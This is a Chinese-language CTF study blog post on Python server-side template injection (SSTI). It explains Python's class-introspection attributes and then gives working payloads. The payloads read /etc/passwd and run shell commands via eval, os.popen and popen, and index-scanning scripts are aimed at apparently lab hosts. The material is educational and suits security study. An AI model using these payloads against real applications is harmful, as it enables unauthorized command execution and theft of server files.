class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/ssti/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>ssti</span></a><a class="article-meta__tags" href="/tags/python/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>python</span></a></span></div></div><h1 class="post-title" itemprop="name headline">ssti学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-01T11:35:21.000Z" title="Created 2024-03-01 19:35:21">2024-03-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-24T13:59:00.560Z" title="Updated 2024-03-24 21:59:00">2024-03-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为福建"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>福建</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/03/01/ssti%E5%AD%A6%E4%B9%A0/"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/ssti/" tabindex="-1" itemprop="url">ssti</a><a href="/tags/python/" tabindex="-1" itemprop="url">python</a><h1 id="CrawlerTitle" itemprop="name headline">ssti学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Sherlock</span><time itemprop="dateCreated datePublished" datetime="2024-03-01T11:35:21.000Z" title="Created 2024-03-01 19:35:21">2024-03-01</time><time itemprop="dateCreated datePublished" datetime="2024-03-24T13:59:00.560Z" title="Updated 2024-03-24 21:59:00">2024-03-24</time></header><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 <code>__class__</code> 是类的一个内置属性，表示类的类型，返回 <code>&lt;type &#39;type&#39;&gt;</code> ； 也是类的实例的属性，表示实例对象的类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h3><p><code>__bases__</code>：用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的<strong>元组</strong>（虽然只有一个元素）。注意是<strong>直接父类</strong>！！！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__[0].__bases__[0]   // python2下与python3下不同</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>获取基类还能用 <code>__mro__</code> 方法，<code>__mro__</code> 方法可以用来获取一个类的调用顺序，比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(B, C):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(D.__mro__)</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>

<p>在这个例子中，类 <code>D</code> 的 MRO 顺序是 <code>D -&gt; B -&gt; C -&gt; A -&gt; object</code>。这意味着在搜索方法时，Python 解释器会先在 <code>D</code> 中查找，然后按照 <code>B -&gt; C -&gt; A -&gt; object</code> 的顺序依次查找父类，直到找到匹配的方法或属性</p>
<p>除此之外，我们还可以利用 <code>__base__</code> 方法获取<strong>直接基类</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&quot;.__class__.__base__</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到最顶层基类（<code>&lt;class&#39;object&#39;&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p>
<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p>在 Python 中，<code>__subclasses__()</code> 是一个特殊方法（也称为魔术方法或魔术属性），用于获取当前类的直接子类列表。</p>
<p>当你调用一个类的 <code>__subclasses__()</code> 方法时，<strong>它会返回一个包含所有直接子类的列表</strong>。这些子类是在程序运行时动态创建的，因此列表的内容取决于程序执行的上下文和流程。</p>
<p>以下是一个简单的示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.__subclasses__())  <span class="comment"># 输出 [&lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;]</span></span><br><span class="line"><span class="built_in">print</span>(B.__subclasses__())  <span class="comment"># 输出 [&lt;class &#x27;__main__.D&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，类 <code>A</code> 有两个直接子类 <code>B</code> 和 <code>C</code>，类 <code>B</code> 有一个直接子类 <code>D</code>。因此，调用 <code>A.__subclasses__()</code> 返回的列表包含了 <code>B</code> 和 <code>C</code>，而调用 <code>B.__subclasses__()</code> 返回的列表只包含了 <code>D</code></p>
<p><strong>注意：</strong>这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。</p>
<p>当然我们也可以直接用<code>object.__subclasses__()</code>，会得到和上面一样的结果。SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p>
<h3 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h3><p>在 Python 中，<code>__builtins__</code> 是一个指向内建模块（built-in module）的引用。这个模块包含了 Python 中内置的常用函数、异常和其他对象。</p>
<p><code>__builtins__</code> 变量是一个字典，包含了内建模块中所有的内置函数和对象。你可以通过 <code>__builtins__</code> 字典来访问这些内置函数和对象。</p>
<p>例如，你可以通过 <code>__builtins__[&#39;print&#39;]</code> 来访问内置的 <code>print</code> 函数，或者通过 <code>__builtins__[&#39;TypeError&#39;]</code> 来访问内置的 <code>TypeError</code> 异常类。</p>
<p>但是在实际编码中，我们通常直接使用内置函数和对象的名称，而不是通过 <code>__builtins__</code> 来访问。例如，我们通常使用 <code>print()</code> 函数而不是 <code>__builtins__[&#39;print&#39;]</code>。</p>
<p>需要注意的是，在一些限制性的环境中，比如一些解释器中或者在使用了 <code>__import__()</code> 函数时，可能会限制对 <code>__builtins__</code> 的直接访问。</p>
<h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>在 Python 中，<code>__globals__</code> 是一个特殊属性，用于访问包含当前作用域中所有全局变量的字典。这个属性是一个字典，它包含了当前作用域中所有全局变量的名称和对应的值。</p>
<p>在 Python 中，每个作用域都有一个与之相关联的 <code>__globals__</code> 字典，用于存储该作用域中的全局变量。这个字典可以通过访问作用域对象的 <code>__globals__</code> 属性来获取</p>
<p>例子如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = 10  # 定义一个全局变量 x</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    y = 20  # 定义一个局部变量 y</span><br><span class="line">    print(&quot;Global variables:&quot;, globals())  # 输出全局变量字典</span><br><span class="line">    print(&quot;Value of x:&quot;, globals()[&#x27;x&#x27;])  # 输出全局变量 x 的值</span><br><span class="line"></span><br><span class="line">func()  # 调用函数</span><br></pre></td></tr></table></figure>

<h2 id="利用-SSTI-读取文件"><a href="#利用-SSTI-读取文件" class="headerlink" title="利用 SSTI 读取文件"></a>利用 SSTI 读取文件</h2><h3 id="Python-2"><a href="#Python-2" class="headerlink" title="Python 2"></a>Python 2</h3><p>在上文中我们使用 <code>__subclasses__</code> 方法查看子类的时候，发现可以发现索引号为40指向file类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()): <span class="built_in">print</span> i</span><br><span class="line">.....</span><br><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br><span class="line">......</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><code>for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print i</code>分析如下：</p>
<ol>
<li><code>&#39;&#39;.__class__</code>: 获取空字符串 <code>&#39;&#39;</code> 的类型，即 <code>str</code> 类型。</li>
<li><code>&#39;&#39;.__class__.__mro__</code>: 获取 <code>str</code> 类型的方法解析顺序（Method Resolution Order，MRO），这是一个元组，包含了当前类和它的父类的顺序。</li>
<li><code>&#39;&#39;.__class__.__mro__[-1]</code>: 获取方法解析顺序中的最后一个类，即 <code>object</code> 类。</li>
<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()</code>: 获取 <code>object</code> 类的所有子类，这是一个列表。</li>
<li><code>enumerate(...)</code>: 对获取到的子类列表进行枚举，返回索引和对应的元素组成的元组。</li>
<li><code>for i in ...: print i</code>: 遍历枚举后的元组列表，并打印每个元组。</li>
</ol>
<p>综上所述，这段代码的作用是遍历 <code>object</code> 类的所有直接子类，并输出它们的索引和对应的子类</p>
<p>此file类可以直接用来读取文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Python-3"><a href="#Python-3" class="headerlink" title="Python 3"></a>Python 3</h3><p>使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。</p>
<p>首先编写脚本遍历目标Python环境中 <code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;FileLoader&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到编号为79</span></span><br></pre></td></tr></table></figure>

<p>所以payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[79][&quot;get_data&quot;](0, &quot;/etc/passwd&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>&#123;&#123; ... &#125;&#125;</code>: 双大括号通常用于表示模板语法，它们可能用于在某些 Web 框架中进行模板渲染，比如在前端的 Vue.js 或 AngularJS 中，或者在后端的像 Flask、Django 等 Web 框架中。</li>
<li><code>().__class__</code>: 这是 Python 中创建一个空的元组，并访问该元组的类。元组的类是 <code>&lt;class &#39;tuple&#39;&gt;</code>。</li>
<li><code>().__class__.__bases__</code>: 这是访问 <code>&lt;class &#39;tuple&#39;&gt;</code> 类的基类，它的基类是 <code>&lt;class &#39;object&#39;&gt;</code>。</li>
<li><code>().__class__.__bases__[0]</code>: 这是获取 <code>&lt;class &#39;tuple&#39;&gt;</code> 类的基类中的第一个元素，即 <code>&lt;class &#39;object&#39;&gt;</code>。</li>
<li><code>().__class__.__bases__[0].__subclasses__()</code>: 这是获取 Python 中 <code>&lt;class &#39;object&#39;&gt;</code> 类的所有子类。这个调用会返回一个包含所有子类的列表。</li>
<li><code>[&quot;get_data&quot;]</code>: 这是对子类对象的属性进行访问，可能是希望访问第 79 个子类对象中名为 <code>get_data</code> 的方法。</li>
<li><code>(0, &quot;/etc/passwd&quot;)</code>: 这是作为参数传递给 <code>get_data</code> 方法的值，可能是为了触发某种行为。</li>
</ol>
<h2 id="利用-SSTI-执行命令"><a href="#利用-SSTI-执行命令" class="headerlink" title="利用 SSTI 执行命令"></a>利用 SSTI 执行命令</h2><h3 id="寻找内建函数-eval-执行命令"><a href="#寻找内建函数-eval-执行命令" class="headerlink" title="寻找内建函数 eval 执行命令"></a>寻找内建函数 eval 执行命令</h3><p>遍历目标Python环境中含有内建函数 eval 的子类的索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    post_url = <span class="string">&quot;http://124.70.99.199:10086/level/1&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(post_url, data=param)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,res.text,res.status_code,<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>所以随便挑一个构造payload为：<code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[158].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;</code></p>
<ol>
<li><code>__import__(&quot;os&quot;)</code>：这是 Python 中的一种导入模块的方法。<code>os</code> 是 Python 标准库中用于与操作系统交互的模块，它包含了许多与文件和目录处理、进程管理等相关的函数和方法。</li>
<li><code>.popen(&quot;ls /&quot;)</code>：<code>popen()</code> 是 <code>os</code> 模块中的一个函数，用于执行系统命令并返回命令的输出。在这里，<code>&quot;ls /&quot;</code> 是一个系统命令，用于列出根目录 <code>/</code> 下的文件和目录列表。</li>
<li><code>.read()</code>：<code>read()</code> 是 <code>popen()</code> 返回的文件对象的方法，用于读取文件内容。</li>
</ol>
<h3 id="寻找-os-模块执行命令"><a href="#寻找-os-模块执行命令" class="headerlink" title="寻找 os 模块执行命令"></a>寻找 os 模块执行命令</h3><p>自己在靶场里面尝试失败</p>
<p>首先编写脚本遍历目标Python环境中含有os模块的类的索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    post_url = <span class="string">&#x27;http://124.70.99.199:10086/level/1&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(post_url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&#x27;!!!!!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, res.text, res.status_code,<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>挑一个构造payload：<code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;</code></p>
<h3 id="寻找-popen-函数执行命令"><a href="#寻找-popen-函数执行命令" class="headerlink" title="寻找 popen 函数执行命令"></a>寻找 popen 函数执行命令</h3><p>首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    post_url = <span class="string">&#x27;http://124.70.99.199:10086/level/1&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span>: <span class="string">&quot;&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(post_url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, res.text, res.status_code, <span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>挑一个构造payload：<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['popen']("ls /").read()&#125;&#125;</code></p>
